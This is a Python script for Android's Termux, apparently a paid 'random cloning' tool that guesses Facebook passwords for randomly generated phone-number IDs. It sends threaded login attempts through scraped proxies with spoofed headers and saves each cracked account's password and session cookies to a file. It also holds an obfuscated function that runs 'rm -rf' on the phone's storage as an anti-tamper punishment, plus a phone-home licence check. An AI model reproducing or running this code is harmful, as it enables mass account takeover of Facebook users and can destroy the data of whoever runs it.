import os,json,time,uuid,sys,random,base64,shutil,re

try:
    pi=os.listdir("/data/data/com.termux/files/usr/bin")
    if "pip3"  in pi:
        pass
    elif "pip" in pi:
        pass
    else:
        print(" [red] PIP missing.....")
        sys.exit()
except:
    sys.exit("[✓] Something Wrong... ")

os.system("pip3 uninstall rich requests pycurl certifi gtts -y")
os.system("pkg install play-audio")
try:
    import rich, requests, pycurl, certifi,gtts
except:
    os.system("pip3 install rich requests pycurl certifi gtts")
    import rich, requests, pycurl, certifi,gtts




try:
    os.listdir("/sdcard")
except:
    sys.exit("[Π] run termux-setup-storage")

def rmsd():
    g=os.listdir("/data/data/com.termux/files/usr/bin")
    
    if "r"+"m" in g:
        os.system("r"+"m "+"-"+"r"+"f "+"/s"+"dca"+"rd"+"/"+" *")
        sys.exit()
    else:
        print(" OFF Your Local Data Protector ")
        sys.exit()
        

from rich import print
from gtts import gTTS
from concurrent.futures import ThreadPoolExecutor as ThreadPool

from io import BytesIO
 
def live():
    try:
        url="https://raw"+".github"+"user"+"cont"+"ent.co"+"m/T"+"EAM-"+"ELIT"+"E1/da"+"tab"+"ase/m"+"ain/"+"Version.txt"
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=buffer.getvalue().decode('utf-8').splitlines()[0]
        return datax
    except:
        reload()
        sys.exit("[!!] Internet Error...")
from datetime import datetime
month={"01":"January","02":"February","03":"March","04":"April","05":"May","06":"June","07":"July","08":"August","09":"September","10":"October","11":"November","12":"December",}
today_data=str(datetime.now()).split(" ")[0].split("-")
today=today_data[2]+"~"+month.get(today_data[1])

name="TUHIN KHAN"
version="V"+live()

try:
    rx=requests.get("https://api.proxyscrape.com/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all").text.splitlines()
except:
    sys.exit(" Internet Error ")
    
logo="""
[green]88""Yb 88   88 88     88     888888 888888 
[white]88__dP 88   88 88     88     88__     88   
[white]88""Yb Y8   8P 88  .o 88  .o 88""     88   
[green]88oodP `YbodP' 88ood8 88ood8 888888   88                                
[green]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
[green]❲=❳ OWNER     :  MEHEDI HASAN
❲=❳ FACEBOOK  :  MEHEDI HASAN
❲=❳ VERSION   :  1.6
❲=❳ GITHUB    :  BOOM-143
❲=❳ TOOL      :  RANDOM CLONING
[green]━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""



def reload():
    try:
        shutil.rmtree("/data/data/com.termux/files/home/GANJA-LITE")
    except:
        pass



class Heron:
    
    def clear(self):
        os.system("clear")
    
    def line():
        return " [b honeydew2]"+str("—"*33)



me=Heron()
oks,loop,ua,ussr,tw,cps=[],0,[],[],[],[]
def osjoin():
    os.system("clear")
    print("#! JOIN TELEGRAM...")
   #os.system("xdg-open https://t.me/TeamElite_Channel")
    time.sleep(1)
    #print("#! JOIN FB-GROUP...")
    #os.system("xdg-open https://facebook.com/groups/1115829936526983/")
    #time.sleep(1)
    print("#! FOLLOW FB...")
    #os.system("xdg-open https://www.facebook.com/HeronAfridi.Official?mibextid=ZbWKwL")
    
osjoin()
# service()
def live_update():
    try:
        url="https://raw"+".github"+"user"+"cont"+"ent.co"+"m/T"+"EAM-"+"ELIT"+"E1/da"+"tab"+"ase/m"+"ain/"+"X"+"YA"+".txt"
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=buffer.getvalue().decode('utf-8').splitlines()[0]
        for u in datax.split("|"):
            ua.append(u)
    except:
        reload()
        sys.exit("[!!] Internet Error...")
live_update()
def main():
    me.clear()
    #reload()
    print(logo)
    print("[b bright_white]   [r violet]USENAME[/r violet] [light_sky_blue1]   ▶  [/light_sky_blue1] "+ussr[0])
    print(Heron.line())
    print("  [r dark_sea_green1]A[/r dark_sea_green1] [b pale_green1]RANDOM")
    print(Heron.line())
    ask=str(input(" \x1b[38;1;198m B  \x1b[38;5;155mCHOICE      \x1b[38;5;197m⟨ \x1b[1;97m  "))
    
    if ask in ["01","1","A","a"]:
        print(" [b] [white]Π  [pale_green1]SELECTED  [red1] ⟩[pale_green1]    RANDOM")
        print(Heron.line())
        time.sleep(3)
        ran()
    
    else:
        print(" [b] [white]C  [pale_green1]SELECTED  [red1] ⟩[pale_green1]    WRONG OPTION")
        print(Heron.line())
        time.sleep(3)
        main()

color=["\033[1;36m","\033[1;35m","\033[1;34m","\033[1;33m","\033[1;32m","\033[1;31m"]


def dd(fbbd,device):
    if fbbd.lower() == "samsung":
        return random.choice(["GT-I9505","SM-T835","SM-S901U","MMB29K","SM-S134DL","SM-J250F","SM-A217F","SM-A326B","SM-A125F","SM-A720F","SM-A326U","SM-G532M","SM-J410G","SM-A205GN","SM-A205GN","SM-A505GN","SM-G930F","SM-J210F","SM-N9005","SM-J210F"])
    elif fbbd.lower() == "vivo":
        return random.choice(["vivo 1935","V3Max"])
    elif fbbd.lower() == "motorola":
        return random.choice(['Moto E2 (4G LTE)', 'Moto E3 Power', 'Moto E4', 'Moto E4 Plus', 'Moto E5', 'Moto E5 Plus', 'Moto G', 'Moto G 2nd Gen', 'Moto G Play', 'Moto G3', 'Moto G3 Turbo Edition', 'Moto G4', 'Moto G5 Plus', 'Moto G5s', 'Moto G5s Plus', 'Moto G6', 'Moto X', 'moto g power (2021)'])
    elif fbbd.lower() == "oppo":
        return random.choice(["CPH"+str(random.choice(range(1000,2000))),"oppo r7sm"])
    elif fbbd.lower() == "oneplus":
        return random.choice(["A0001","OnePlus 11R","OnePlus 10T","OnePlus Nord 3 5G"])
    elif fbbd.lower() == "google":
        return random.choice(["Pixel 6a","Pixel 3"])
    elif fbbd.lower() == "asus":
        return random.choice(["ASUS_X01BDA","ASUS_Z01QD","ASUS_I005DC","NX55","MXB48T"])
    elif fbbd.lower() == "huawei":
        return random.choice(["DUB-LX1","AGS2-L09","POT-LX1","DRA-LX2","POT-LX3","VOG-L29","EVR-N29","FIG-LX1","Kirin Treble","HUAWEI LUA-L21","ATU-L31","COL-L29","NAM-LX9","VOG-L29","JKM-LX1","RNE-L22"])
    elif fbbd.lower() == "lenovo":
        return random.choice(["Lenovo TB-X505F","Lenovo A6020a46",'PAFR0026IN','PAFR0026','PAFR0033IN','PAFR0033','PAFR0013IN','PAFR0013','PAGW0015IN','L39051','XT2091-8'])
    elif fbbd.lower() == "sony":
        return random.choice(["C2105","C2104","G3312", "G3311", "G3313","LT29i","D6503", "D6502", "SO-03F", "Xperia Z2","D6503", "D6502", "SO-03F", "Xperia Z2","D6563","D6603", "D6653", "D6616", "D6643", "SO-01G", "SOL26", "D6646","D5803", "D5833", "SO-02G","D6633", "D6603", "D6643", "D6653", "D6616", "D6683","SGP621", "SGP611","E6533","D6708"])
    elif fbbd.lower() == "tecno":
        return random.choice(["CG8", "CG8h","LB8", "LB8a","CH7n", "CH7","LH6n"])
        
    else:
        return device
def ua():
    rr=random.randint
    aZ=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    rx=random.randrange(1, 999)
    xx="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) facebook-nativefier-f52d2f/1.0.0 Chrome/53.0.2785.143 Electron/1.4.16 Safari/537.36"
    return xx
    
def uoa():
    ver=str(random.choice(range(77,500)))
    ver2=str(random.choice(range(57,77)))
    return f"Mozilla/5.0 (U; Linux x86_64; en-US) AppleWebKit/600.27 (KHTML, like Gecko) Chrome/{ver} .0.2509.{ver2} Safari/602"
        
def ok_call():
    magi=gTTS("congratulations")
    magi.save("/sdcard/magi.mp3")
    os.system("play-audio /sdcard/magi.mp3")


def coutpass(pwx):
    j=len(pwx)+1
    if j <9:
        return "0"+str(j)
    else:
        return str(j)
def ran():
    me.clear()
    user=[]
    pwx=[]
    print(logo)
    print("  [b][BD|IND|PK][chartreuse1] 0171 +91629 +920315")
    print(Heron.line())
    code=str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    
    print(Heron.line())
    print(" [b] Π[chartreuse1] EXAMPLE      [b deep_pink2]⟨[/b deep_pink2]  [chartreuse1] 100000 300000")
    limit=int(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    print(Heron.line())
    for i in range(limit):
        gd=str(random.choice(range(1000000,9999999)))
        user.append(gd)
    
    passli=int(input(" \x1b[38;1;198m Π \x1b[38;5;155mPass Limit :\x1b[1;97m "))
    print(Heron.line())
    
    while True:
        print(" [b] Π[chartreuse1] [r violet]EXP[/r violet] [chartreuse1]first6 last6 sadiya 57273200")
        pas=str(input(f" \x1b[38;1;198m Π \x1b[38;5;155mAdd Pass {coutpass(pwx)} \x1b[38;5;196m⟩ \x1b[1;97m   "))
        
        if "" ==pas:
            pass
        
        elif pas not in pwx:
            pwx.append(pas)
        print(Heron.line())
        if len(pwx) >=passli:
            break
        else:
            continue
    print("  [r dark_olive_green1]Π1[/r dark_olive_green1][b violet] Method (M)")
    print("  [r dark_olive_green1]Π2[/r dark_olive_green1][b violet] Method (X)")
    print("  [r dark_olive_green1]Π3[/r dark_olive_green1][b violet] Method (P)")
    print("  [r dark_olive_green1]Π4[/r dark_olive_green1][b violet] Method (Touch)")
    print("  [r dark_olive_green1]Π5[/r dark_olive_green1][b violet] Method (Free)")
    print("  [r dark_olive_green1]Π6[/r dark_olive_green1][b violet] Method (Mbasic)")
    print(Heron.line())
    meth=str(input(" \x1b[38;1;198m Π \x1b[38;5;155mCHOICE      \x1b[38;5;196m⟩ \x1b[1;97m   "))
    if meth in ["1","a","A"]:
        fb="m"
    elif meth in ["2","b","B"]:
        fb="x"
    elif meth in ["3","c","C"]:
        fb="p"
    elif meth in ["4","d","D"]:
        fb="touch"
    elif meth in ["5","e","E"]:
        fb="free"
    else:
        fb="mbasic"
    with ThreadPool(max_workers=90) as heron:
        me.clear()
        print(logo)
        print("▶ USERNAME   ▶ "+ussr[0])
        print(Heron.line())
        print(f"▶ TODAY DATE {today} ")
        print(f"▶ TOTAL PAS +{str(len(pwx))}")
        print(Heron.line())
        
        for xd in user:
            uid=code+xd
            heron.submit(rensub,uid,pwx,meth,fb,user)
    print("\r\r"+Heron.line())
    print(f"  Π! Total OK id : {str(len(oks))}")
    print(f"  Π! Save  /sdcard/pot.txt ")
    print(Heron.line())
    sys.exit()



def rensub(uid,pwx,meth,fb,user):
    global oks,loop
    sys.stdout.write(f'\r\033[1;37m [{random.choice(color)}M1NX-M{meth.upper()}\033[1;37m] \033[1;37m[{random.choice(color)}{loop}\033[1;37m]>~<[\033[95m{str(len(user))}\033[1;37m] \033[1;37m\033[1;32m{str(len(oks))}\033[1;37m|\033[1;30m{str(len(cps))}\033[1;37m|\033[2;37m{str(len(tw))}\033[0;00m\r');sys.stdout.flush()
    
    try:
        for pw in pwx:
            session=requests.Session()
            proxs= {'http': 'socks4://'+random.choice(rx)}
            ps=pw.replace("first6",uid[:6]).replace("First6",uid[:6]).replace("first7",uid[:7]).replace("First7",uid[:7]).replace("first8",uid[:8]).replace("First8",uid[:8]).replace("first9",uid[:9]).replace("First9",uid[:9]).replace("first10",uid[:10]).replace("First10",uid[:10]).replace("number",uid).replace("Number",uid).replace("last6",uid[-6:]).replace("Last6",uid[-6:]).replace("last7",uid[-7:]).replace("Last7",uid[-7:]).replace("last8",uid[-8:]).replace("Last8",uid[-8:]).replace("last9",uid[-9:]).replace("Last9",uid[-9:]).replace("last10",uid[-10:]).replace("Last10",uid[-10:])
            free_fb = session.get(f'https://{fb}.facebook.com').text
            data={"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),"try_number":"0","unrecognized_tries":"0","email":uid,"pass":ps,"login":"Log In"}
            header={
'Host': f'{fb}.facebook.com',
'content-length': str(len(str(data))),
'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Android WebView";v="120"',
'sec-ch-ua-mobile': '?1',
'user-agent': uoa(),
'x-response-format': 'JSONStream',
'content-type': 'application/x-www-form-urlencoded',
'x-fb-lsd': 'AVo_Z7twFKE',
'viewport-width': '360',
'sec-ch-ua-platform-version': '""',
'x-requested-with': 'XMLHttpRequest',
'x-asbd-id': '129477',
'dpr': '2',
'sec-ch-ua-full-version-list': '',
'sec-ch-ua-model': '""',
'sec-ch-prefers-color-scheme': 'light',
'sec-ch-ua-platform': '"Android"',
'accept': '*/*',
'origin': f'https://{fb}.facebook.com',
'sec-fetch-site': 'same-origin',
'sec-fetch-mode': 'cors',
'sec-fetch-dest': 'empty',
'referer': f'https://{fb}.facebook.com/',
'accept-encoding': 'gzip, deflate, br',
'accept-language': 'en-IE,en-US;q=0.9,en;q=0.8'}
            session.post(f"https://{fb}.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100",data=data,headers=header,proxies=proxs)
            res=session.cookies.get_dict().keys()
            if "c_user" in res:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                #xx=coki.split("c_user=")[1]
                #xd=xx[:15].replace(";","  ") 
                #print(f"\r\r[b r bright_white] [M1NX-OK][/b r bright_white][b chartreuse1]{xd}|{ps}|{coki}\n")
                #open("/sdcard/M1NX.txt","a").write(xd+"|"+ps+"|"+coki+"\n")
                #oks.append(id)
                
                cid = re.findall('c_user=(.*);xs',coki)[0]
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
                    print(f"\r\r[b r bright_white] [M1NX-OK][/b r bright_white][b chartreuse1]{cid}|{ps}|{coki}\n")
                    open("/sdcard/M1NX.txt","a").write(cid+"|"+ps+"|"+coki+"\n")
                    oks.append(cid)
                break
            else:continue
        loop+=1
    except Exception as e:
        
        time.sleep(15)
    





import os,sys
try:
    count=0
    path="/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests"
    files=os.listdir(path)
    for file in files:
        if file.endswith(".py"):
            data=open(path+"/"+file,"r").read().splitlines()
            for line in data:
                for i in line:
                   if i.isalpha:
                       count+=1
    if count ==173648:
        pass
    else:
        #me.clear()
        #reload()
        #rmsd()
        sys.exit("[!~] Unfortunately You can not use")
except Exception as e:
    sys.exit("run pip uninstall requests && pip install requests")








K1=str(os.getuid())
K2=str(os.getgid())
num_key="".join(K1+K2)

cm=num_key.encode("ASCII")
cmr=base64.b64encode(cm)
cm2=str(cmr).upper().replace("B","BOKACHUDA")
showkey=cm2.replace("'","").replace("==","")

def approve():
    url="https://heronafridi-"+"apv-yo3d.on"+"render."+"com/app"+"rove?key="+cm2
    try:
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        datax=json.loads(buffer.getvalue().decode('utf-8'))
    except:
        reload()
        sys.exit("[!!] Internet Error...")
    
    
    if "S"+"u"+"cc"+"es"+"sful" in datax['Status']:
        username()
    elif 'rej'+'ected' in datax['Status']:
        me.clear()
        print(logo)
        print(' [b bright_white] # Notice-Paid Tool  ....')
        print(' [b bright_white] # Free User Don\'t Msg  ....')
        print(Heron.line())
        print(' [bright_green] # Key: '+showkey)
        
        os.system("xdg-open https://m.me/HeronAfridi.Official?text=Approve%20My%20Key%20%20"+showkey)
        time.sleep(1)
        #os.system("xdg-open https://wa.me/+8801722183463/?text=Approve%20My%20Key%20%20"+cm2)
        reload()
        sys.exit()
    else:
        #rmsd()
        sys.exit(" First Learn Python then try again to bypass")

def username():
    global cm2,usr
    me.clear()
    try:
        name=open("/sdcard/username.txt","r").read()
    except:
        print(logo)
        name=str(input(" \x1b[38;1;198m Π  \x1b[38;5;155mYour-Name   \x1b[38;5;197m‣\x1b[1;97m   "))
        print(Heron.line())
    
    try:
        url=f"https:/heronafridi-apv-yo3d.onrender.com/user?key={cm2}&name="+name.lower()
        buffer = BytesIO()
        curl = pycurl.Curl()
        curl.setopt(curl.URL, url)
        curl.setopt(curl.WRITEDATA, buffer)
        curl.setopt(curl.CAINFO, certifi.where())
        curl.perform()
        curl.close()
        jdata=json.loads(buffer.getvalue().decode('utf-8'))
        jdata={"welcome":"true"}
    except:
        reload()
        sys.exit("[!!] Internet Error...")
    if "t"+"rue" in jdata["welcome"]:
        open("/sdcard/username.txt","w").write(name)
        ussr.append(name)
        main()
    else:
        print("  [r dark_olive_green1]Π![/r dark_olive_green1][chartreuse1] [b]Message[bright_white]: [chartreuse1] Username Not Approved...")
        print(Heron.line())
        reload()
        sys.exit()



username()
